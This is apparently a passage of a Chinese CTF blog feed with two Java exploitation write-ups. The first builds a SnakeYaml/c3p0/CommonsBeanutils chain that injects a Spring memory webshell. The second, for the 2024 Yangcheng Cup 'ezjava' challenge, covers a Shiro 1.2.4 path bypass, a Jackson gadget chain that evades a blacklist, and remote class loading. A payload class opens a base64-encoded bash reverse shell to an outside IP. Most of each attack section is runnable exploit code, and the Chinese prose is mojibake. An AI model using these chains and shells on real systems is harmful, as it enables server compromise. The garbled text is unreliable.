alt="image.png"></p><p>é¶åœºä¹ŸOK</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%207.png" alt="image.png"></p><p>åç»­å­¦ä¸€ä¸‹jaræ€ä¹ˆå†™çš„ï¼Œæ‡’äº†ï¼Œè¿™é‡Œä¸æƒ³åŠ¨äº†</p><h1 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h1><aside>ğŸ’¡<p>yamlæ‰“c3p0äºŒæ¬¡ååºåˆ—åŒ–ï¼Œä¸å‡ºç½‘æ‰“å†…å­˜é©¬</p><p>åˆ©ç”¨snakeyamlååºåˆ—åŒ–ä¼šè°ƒç”¨æ„é€ æ–¹æ³•å’Œgetteræ–¹æ³•ç‰¹æ€§æ‰“c3p0çš„<code>*WrapperConnectionPoolDataSource</code>* æ„é€ å‡½æ•°ï¼Œåˆ©ç”¨å…¶hexå­—èŠ‚ç åŠ è½½å™¨äºŒæ¬¡ååºåˆ—åŒ–æ‰“å†…å­˜é©¬</p><p>çœ‹ä¾èµ–è¿˜æœ‰ä¸ªCBï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨CBå»æ‰“å†…å­˜é©¬å³å¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%208.png" alt="image.png"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">xiinnn</span>.<span class="property">SnakeYaml</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">bcel</span>.<span class="property">internal</span>.<span class="property">Repository</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">trax</span>.<span class="property">TemplatesImpl</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">trax</span>.<span class="property">TransformerFactoryImpl</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">xiinnn</span>.<span class="property">commonly</span>.<span class="property">SpringMemShell</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">commons</span>.<span class="property">beanutils</span>.<span class="property">BeanComparator</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.*;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Field</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">PriorityQueue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * åˆ©ç”¨snakeyamlè§¦å‘æ„é€ å‡½æ•°çš„ç‰¹æ€§ï¼Œå»è§¦å‘c3p0çš„WrapperConnectionPoolDataSourceï¼Œç„¶åäºŒæ¬¡ååºåˆ—åŒ–</span></span><br><span class="line"><span class="comment"> * è¿™æ¡é“¾æ˜¯æ‰“readObjectï¼Œæ‰€ä»¥å¯ä»¥æ‰“å†…å­˜é©¬åº”å¯¹ä¸å‡ºç½‘æƒ…å†µ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">CB2C3p0TOSnakeYaml</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line">        byte[] bytes = <span class="title class_">Repository</span>.<span class="title function_">lookupClass</span>(<span class="title class_">SpringMemShell</span>.<span class="property">class</span>).<span class="title function_">getBytes</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title class_">TemplatesImpl</span> templates = <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="title function_">setFieldValue</span>(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> byte[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="title function_">setFieldValue</span>(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="title function_">setFieldValue</span>(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        BeanComparator beanComparator = new BeanComparator(); //ä¾èµ–äºCCåº“</span></span><br><span class="line">        <span class="title class_">BeanComparator</span> beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, <span class="title class_">String</span>.<span class="property">CASE_INSENSITIVE_ORDER</span>); <span class="comment">//ä¸ä¾èµ–CCåº“</span></span><br><span class="line">        <span class="title class_">PriorityQueue</span>&lt;<span class="title class_">Object</span>&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,beanComparator);</span><br><span class="line"></span><br><span class="line">        queue.<span class="title function_">add</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.<span class="title function_">add</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">setFieldValue</span>(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//        beanComparator.compare(templates, templates);</span></span><br><span class="line">        <span class="title function_">setFieldValue</span>(queue,<span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> <span class="title class_">Serhex</span> = <span class="title function_">bytesToHexString</span>(<span class="title function_">serialize</span>(queue));</span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> hexcode = <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;userOverridesAsString: HexAsciiSerializedMap:&quot;</span> + <span class="title class_">Serhex</span> + <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(hexcode);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Unserialize(&quot;sercb.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    public <span class="keyword">static</span> byte[] <span class="title function_">serialize</span>(<span class="title class_">Object</span> obj) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="title class_">ByteArrayOutputStream</span> bos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">             <span class="title class_">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos)) &#123;</span><br><span class="line">            oos.<span class="title function_">writeObject</span>(obj);</span><br><span class="line">            <span class="keyword">return</span> bos.<span class="title function_">toByteArray</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">bytesToHexString</span>(<span class="params">byte[] byteArray</span>) &#123;</span><br><span class="line">        <span class="title class_">StringBuilder</span> sb = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (byte b : byteArray) &#123;</span><br><span class="line">            <span class="title class_">String</span> hex = <span class="title class_">Integer</span>.<span class="title function_">toHexString</span>(b &amp; <span class="number">0xFF</span>);</span><br><span class="line">            <span class="keyword">if</span> (hex.<span class="title function_">length</span>() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.<span class="title function_">append</span>(<span class="string">&#x27;0&#x27;</span>); <span class="comment">// è¡¥é½ä¸ºä¸¤ä½</span></span><br><span class="line">            &#125;</span><br><span class="line">            sb.<span class="title function_">append</span>(hex.<span class="title function_">toUpperCase</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="title class_">Object</span> <span class="title class_">Unserialize</span>(<span class="title class_">String</span> filePath) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">ObjectInputStream</span> objectInputStream = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath));</span><br><span class="line">        <span class="title class_">Object</span> o = objectInputStream.<span class="title function_">readObject</span>();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span>(<span class="title class_">Object</span> obj, <span class="title class_">String</span> fieldName, <span class="title class_">Object</span> value) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="title class_">Field</span> field = obj.<span class="title function_">getClass</span>().<span class="title function_">getDeclaredField</span>(fieldName);</span><br><span class="line">        field.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        field.<span class="title function_">set</span>(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶ä¸­SpringMemShellä¸ºspringå†…å­˜é©¬ï¼Œç”Ÿæˆçš„ç»“æœå¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%209.png" alt="image.png"></p><p>urlç¼–ç ä¸€ä¸‹æ‰“å³å¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%2010.png" alt="image.png"></p><p>æ—¥å¸¸500ï¼Œè®¿é—®ä¸€ä¸‹shellçœ‹æ˜¯å¦æ‰“æˆåŠŸäº†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%2011.png" alt="image.png"></p><p>ç›´æ¥è¯»å–flagå³å¯</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://landgrey.me/blog/22/">LandGreyâ€™s Blog</a></p><p><a href="https://mp.weixin.qq.com/s/n8RW0NIllcQ0sn3nI9uceA">https://mp.weixin.qq.com/s/n8RW0NIllcQ0sn3nI9uceA</a></p><p><a href="https://p0lar1ght.github.io/posts/PolarD&N_CTF_%E4%B8%80%E5%86%99%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%90%B1%E5%A3%B0/">è®°ä¸€æ¬¡CTFå‡ºé¢˜ä¹‹ä¸€å†™ä¸€ä¸ªä¸å±å£°_WPç¯‡ | P0l@R19ht</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024ç¾ŠåŸæ¯-ezjava</title>
      <link href="/2024/08/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-ezjava/"/>
      <url>/2024/08/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-ezjava/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªé¢˜é“¾å­å¾ˆç®€å•ï¼Œéƒ½æ˜¯å·²ç»å…¬å¼€çš„ï¼Œå°±æ˜¯æœ‰äº›ç‚¹æœ‰ç‚¹å‘</p><p>æ‹¿åˆ°é™„ä»¶åç¼–è¯‘ï¼Œæœ¬åœ°èµ·ç¯å¢ƒç”¨cfrå°±è¡Œï¼Œç¡®å®æ¯”è¾ƒæ–¹ä¾¿</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹æ˜¯ç›´æ¥æ‰¾ååºåˆ—åŒ–çš„ç‚¹ï¼Œåœ¨<code>UserControler</code> ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146907.png" alt="image.png"></p><p>ä½†æ˜¯è¿™é‡Œæœ‰shiroæƒé™æ ¡éªŒ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146887.png" alt="image.png"></p><p>çœ‹shiroç‰ˆæœ¬1.2.4æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼ŒåŠ ä¸ª<code>/</code> å³å¯ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146565.png" alt="image.png"></p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥æ¥åˆ°ååºåˆ—åŒ–è¿™é‡Œï¼Œç„¶åå°±æ˜¯é»‘åå•äº†</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">static</span> final <span class="title class_">String</span>[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="string">&quot;java.security.SignedObject&quot;</span>, <span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>, <span class="string">&quot;org.apache.commons.beanutils&quot;</span>, <span class="string">&quot;org.apache.commons.collections&quot;</span>, <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨çš„æ˜¯<code>resolveClass</code> åŠ è½½çš„ç±»ï¼Œæ‰€ä»¥overlongencodingæ²¡æ³•ç»•ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°Jacksonçš„é‚£æ¡é“¾ä¸åœ¨é»‘åå•æ‰€ä»¥ç›´æ¥ç”¨é‚£ä¸ªé“¾å³å¯ï¼Œä½†æ˜¯<code>BadAttributeValueExpException</code> åœ¨é»‘åå•ï¼Œå…¸å‹çš„è§¦å‘toStringæ–¹æ³•çš„ç±»è¢«banäº†ï¼Œä½†æ˜¯æœ€è¿‘å…¬å¼€äº†å¾ˆå¤šï¼Œå‰ä¸ä¹…çš„é˜¿é‡Œäº‘å°±å…¬å¼€äº†ä¸€ä¸ª<code>EventListenerList</code> ç±»è§¦å‘ï¼ŒåŒæ ·ä¹Ÿæ˜¯readObjectæ–¹æ³•è§¦å‘ï¼Œæ‰€ä»¥å¾ˆå¥½çš„å¹³æ›¿äº†</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">EventListenerList</span> --&gt; <span class="title class_">UndoManager</span>#<span class="title function_">toString</span>() --&gt;<span class="title class_">Vector</span>#<span class="title function_">toString</span>() --&gt; <span class="title class_">POJONode</span>#<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯<code>TemplatesImpl</code> ï¼Œè¿™ä¸ªè¢«åŠäº†ï¼Œå½“æ—¶å°±æ˜¯åœ¨è¿™é‡Œå¡æ­»äº†ï¼Œbcelè¿™é‡Œæ²¡ä¾èµ–æ‰“ä¸äº†ï¼Œ<code>LdapAttribute</code> ä¹Ÿåœ¨é»‘åå•ï¼Œæ‰€ä»¥åªå‰©ä¸ªè¿œç¨‹ç±»åŠ è½½ï¼Œä¸€å¼€å§‹æˆ‘å¿½ç•¥äº†Userç±»åé¢æ‰çœ‹åˆ°ï¼Œè¿˜æ‰¾äº†åŠå¤©è¿œç¨‹ç±»åŠ è½½çš„è§¦å‘ç‚¹ã€‚ã€‚ã€‚</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311146661.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªUserç±»åŠ è½½è¿œç¨‹çš„æ–¹æ³•æ˜¯å…¸å‹çš„getterï¼Œé‚£ä¹ˆé“¾åˆ°è¿™é‡Œå°±å¥½äº†ï¼Œä¸è¿‡è¿™é‡Œbanäº†httpå’Œfileï¼Œç»•è¿‡æ–¹å¼æˆ‘çŸ¥é“çš„æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯<code>jar:http</code> ï¼Œå¦ä¸€ç§æ˜¯<code>url:http</code> (å·å­¦è‡ªsnowå¸ˆå‚…)ï¼Œä¸ºä»€ä¹ˆèƒ½å¤Ÿç”¨urlç»•å‘¢ï¼Œç®€å•è°ƒè¯•ä¸€ä¸‹å…¶å®å°±èƒ½å‘ç°</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147952.png" alt="5ec2f8fc68b795e4a4f8bfdd9805bbd9.png"></p><p>URLç±»é‡Œé¢æœ‰å¤„ç†urlçš„é€»è¾‘</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147540.png" alt="4fcf8f8e1b8457306a7e0ac83a02ebaa.png"></p><p>æ‰€ä»¥è¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†ï¼Œç®€å•è°ƒè¯•äº†ä¸€ä¸‹æ²¡å…·ä½“ç»†çœ‹é€»è¾‘</p><p>ç„¶åå‘ç‚¹æ¥äº†ï¼ˆå…¶å®ä¹Ÿä¸èƒ½ç®—æ˜¯å‘ç‚¹ï¼Œè¿˜æ˜¯è‡ªå·±æ²¡å’‹ç”¨è¿‡è¿œç¨‹ç±»åŠ è½½ï¼‰ï¼Œè¿™é‡ŒUserç±»ä¸­çš„<code>getGift</code> æ–¹æ³•åªæ˜¯æŠŠè¿œç¨‹è·¯å¾„å»åŠ è½½è¿›å»ï¼Œå¦‚æœä½ ä¸è§¦å‘è¿™é‡Œé‚£ä¹ˆæ˜¯ä¸ä¼šå»è¯·æ±‚è¿œç¨‹ç±»çš„ï¼Œå¦å¤–<code>URLClassLoader</code> æ˜¯å…ˆä¼šä»æœ¬åœ°åŠ è½½ç±»ï¼Œæ‰¾ä¸åˆ°æ‰ä¼šåŠ è½½è¿œç¨‹ç±»ï¼Œæ‰€ä»¥ä½ çš„æ¶æ„ç±»ä¸èƒ½å¸¦åŒ…åï¼Œå¦åˆ™å®ƒå°±ä¼šå½“æˆæ˜¯ä½ æœ¬åœ°çš„ç±»ï¼Œä¹Ÿä¸ä¼šå»è¿œç¨‹åŠ è½½äº†</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>é“¾å­payloadå¦‚ä¸‹ï¼Œæ¥è‡ªå¤§å¤´çš„é¡¹ç›®ç¨å¾®æ”¹æ”¹å°±è¡Œ<a href="https://github.com/LxxxSec/CTF-Java-Gadget">https://github.com/LxxxSec/CTF-Java-Gadget</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.myself;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ycbjava.bean.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ycb</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass0</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass0.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass0.removeMethod(writeReplace);</span><br><span class="line">        ctClass0.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;url:http://192.168.1.100:8888/&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//EventListenerList --&gt; UndoManager#toString() --&gt;Vector#toString() --&gt; POJONode#toString()</span></span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(pojoNode);</span><br><span class="line">        setFieldValue(list, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Map.class, manager&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(list);</span><br><span class="line"></span><br><span class="line">        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> field.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calcå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    